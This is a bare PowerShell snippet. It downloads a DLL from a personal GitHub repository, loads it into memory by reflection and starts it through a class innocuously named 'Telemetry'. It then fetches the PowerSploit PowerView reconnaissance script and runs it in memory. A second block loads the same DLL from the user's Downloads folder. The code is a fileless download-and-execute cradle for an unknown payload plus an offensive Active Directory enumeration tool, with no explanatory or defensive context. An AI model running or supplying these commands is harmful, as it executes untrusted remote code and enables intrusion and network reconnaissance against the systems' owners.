$dll = (New-Object Net.WebClient).DownloadData('https://github.com/ChilliCheeseByte/myfile/raw/refs/heads/main/myfile.dll'); [System.Reflection.Assembly]::Load([byte[]]$dll); [Telemetry.Engine.ContextManager]::Init(); $tool = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1'); . ([ScriptBlock]::Create($tool))

$dll = [System.IO.File]::ReadAllBytes("$env:USERPROFILE\Downloads\myfile.dll")
[System.Reflection.Assembly]::Load([byte[]]$dll)
[Telemetry.Engine.ContextManager]::Init()
